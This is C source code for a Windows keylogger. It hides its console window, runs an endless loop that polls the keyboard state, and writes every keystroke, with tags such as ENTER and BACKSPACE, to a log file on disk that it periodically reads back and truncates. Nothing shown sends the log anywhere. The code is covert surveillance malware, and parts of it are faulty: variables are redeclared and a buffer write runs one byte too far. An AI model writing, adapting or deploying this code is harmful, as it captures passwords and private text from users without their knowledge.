

#define LogLength 100
#define FileName "C:\\logs\\logger.txt"
int get_keys(void);

int get_keys()
{
int freadindex;
char *buf;
long len;
FILE *file;
file=fopen(FileName,"a+");


           short character;
             while(1)
             {
                    Sleep(10);/*to prevent 100% cpu usage*/
                    for(character=8;character<=222;character++)
                    {
                        if(GetAsyncKeyState(character)==-32767)
                        {  
                            FILE *file;
                            file=fopen(FileName,"a+");
                            if(file==NULL)
                            {
                                    return 1;
                            }            
                            if(file!=NULL)
                            {        
                                    if((character>=39)&&(character<=64))
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }        
                                    else if((character>64)&&(character<91))
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)
                                        {
                                              case VK_SPACE:
                                              fputc(' ',file);
                                              fclose(file);
                                              break;    
                                              case VK_SHIFT:
                                              fputs("\r\n[SHIFT]\r\n",file);
                                              fclose(file);
                                              break;                                            
                                              case VK_RETURN:
                                              fputs("\r\n[ENTER]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs("\r\n[BACKSPACE]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs("\r\n[TAB]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("\r\n[CTRL]\r\n",file);
                                              fclose(file);
                                              break;    
                                              case VK_DELETE:
                                              fputs("\r\n[DEL]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_1:
                                              fputs("\r\n[;:]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_2:
                                              fputs("\r\n[/?]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_3:
                                              fputs("\r\n[`~]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_4:
                                              fputs("\r\n[ [{ ]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_5:
                                              fputs("\r\n[\\|]\r\n",file);
                                              fclose(file);
                                              break;                                
                                              case VK_OEM_6:
                                              fputs("\r\n[ ]} ]\r\n",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_7:
                                              fputs("\r\n['\"]\r\n",file);
                                              fclose(file);
                                              break;
                                              case 187:
                                              fputc('+',file);
                                              fclose(file);
                                              break;
                                              case 188:
                                              fputc(',',file);
                                              fclose(file);
                                              break;
                                              case 189:
                                              fputc('-',file);
                                              fclose(file);
                                              break;
                                              case 190:
                                              fputc('.',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("\r\n[CAPS LOCK]\r\n",file);
                                              fclose(file);
                                              break;
                                              default:
                                              fclose(file);
                                              break;
                                       }        
                                  }    
                             }        
                   }    
               }                  
           FILE *file;
           file=fopen(FileName,"rb");
           fseek(file,0,SEEK_END); //go to end
           len=ftell(file); //get position at end (length)
           if(len>=LogLength) {
             fseek(file,0,SEEK_SET);//go to beg.
             buf=(char *)malloc(len);//malloc buffer
             freadindex=fread(buf,1,len,file);//read into buffer
             buf[freadindex] = '\0';//Extra bit I have to add to make it a sting
             
             fclose(file);
             file=fopen(FileName,"w");                        
             }
           
            fclose(file);
           
                 
           }
           return EXIT_SUCCESS; 
	}

int main()
{
	
   
   HWND stealth; /*creating stealth */
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);
   
   FILE *file;
   
   file=fopen(FileName,"a+");
   time_t theTime=time(0);
   fputs("\nStarted logging: ", file);
   fputs(ctime(&theTime),file);
   fclose(file);
    
   int t=get_keys();    
   return t;
}  




